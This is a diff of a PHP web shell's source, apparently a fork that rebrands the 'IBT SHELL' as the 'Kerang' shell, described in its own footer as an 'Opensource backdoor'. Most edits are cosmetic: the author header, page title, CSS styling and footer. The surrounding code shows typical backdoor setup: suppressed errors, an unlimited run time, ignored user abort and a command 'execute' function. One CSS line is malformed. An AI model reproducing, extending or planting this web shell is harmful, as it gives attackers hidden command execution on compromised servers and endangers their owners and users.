@@ -1,10 +1,8 @@
 <?php
 /*
-SHELL INDONESIAN BACKTRACK TEAM
-AUTHOR : CEEMDE aka PARIKESIT
-KURAWA IBT
+Kerang Opensource PHP Shell
+AUTHOR : abdilahrf
 DATE : 30/11/2014
-COPYRIGHT : MIT LICENSE
 FOR EDUCATIONAL PURPOSE
 */
 
@@ -13,33 +11,32 @@ error_reporting(E_ERROR | E_PARSE);
 @ini_set("max_execution_time",0);
 @set_time_limit(0); #No Fx in SafeMode
 @ignore_user_abort(TRUE);
-@set_magic_quotes_runtime(0);
+
+// validate if magic_quotes_runtime is available
+if(get_magic_quotes_runtime())
+{
+    // Deactivate
+    set_magic_quotes_runtime(0);
+}
 ?>
 
 <html>
 <head>
-<title>IBT SHELL</title>
+<title>Kerang</title>
 <style>
 body {
 margin:0;
 color:#fff;
-letter-spacing:0.5px;
-/* Location of the image */
-background-image: url(ibt.png);
-/* Background image is centered vertically and horizontally at all times */
-background-position: center center;
-/* Background image doesn't tile */
-background-repeat: no-repeat;
-/* Background image is fixed in the viewport so that it doesn't move when 
-the content's height is greater than the image's height */
-background-attachment: fixed;
-/* This is what makes the background image rescale based
-on the container's size */
-background-size: cover;
+/* Set font-family to monospace for better readability */
+font-family: monospace;
 /* Set a background color that will be displayed
 while the background image is loading */
-background-color: #464646 ;
+background:color:#232526;
+background: 
+-webkit-linear-gradient(to right, #414345, #232526),  /* Chrome 10-25, Safari 5.1-6 */
+linear-gradient(to right, #414345, #232526); /* W3C, IE 10+/ Edge, Firefox 16+, Chrome 26+, Opera 12+, Safari 7+ */
 }
+
 p{
 font-size:14px;
 line-height:24px;
@@ -239,11 +236,11 @@ function actionSecInfo() {
 	echo '</div>';
 
 }
+
 //Disable Function
 $disable_functions = @ini_get('disable_functions');
 
 //Execute Function
-
 if(!function_exists('execute')){
 	function execute($code){
 		$output = "";
@@ -731,7 +728,7 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 		</tr>
 		<tr>
 			<td>
-				<p style="text-align:center;font-weight:bolder;">Copyright Indonesian Backtrack Team</p>
+				<p style="text-align:center;font-weight:bolder;">Opensource backdoor <a href="https://github.com/abdilahrf/Kerang">Kerang</a></p>
 			</td>
 		</tr>
 	</table>
@@ -753,5 +750,3 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 ?>
 </body>
 </html>
-
-
